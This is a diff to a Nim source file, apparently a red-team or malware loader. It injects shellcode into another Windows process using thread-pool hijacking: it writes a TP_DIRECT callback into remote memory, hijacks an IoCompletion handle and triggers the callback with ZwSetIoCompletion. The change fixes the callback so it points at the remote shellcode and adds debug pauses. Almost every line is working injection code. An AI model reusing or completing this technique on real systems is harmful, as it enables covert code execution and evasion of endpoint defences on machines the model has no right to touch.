@@ -96,12 +96,16 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
         cast[SIZE_T](shellcodeBytes.len),
         addr bytesWritten
     )
+    echo "Shellcode: " & $cast[int](targetPtr).toHex
+    discard stdin.readLine
 
     # Varient 7 ?
     var Direct: TP_DIRECT
-    Direct.Callback = shellcodeBytesPtr
+    Direct.Callback = targetPtr
     var RemoteDirectAddress: PTP_DIRECT = cast[PTP_DIRECT](VirtualAllocEx(targetHandle, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
     discard NtWriteVirtualMemory(targetHandle, RemoteDirectAddress, addr Direct, sizeof(TP_DIRECT), NULL)
+    echo "TP_DIRECT: " & $cast[int](RemoteDirectAddress).toHex
+    discard stdin.readLine
     var IoCompletionHandle = hijackProcessHandle(newWideCString("IoCompletion"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
     ZwSetIoCompletion(IoCompletionHandle, RemoteDirectAddress, NULL, 0, 0)
 
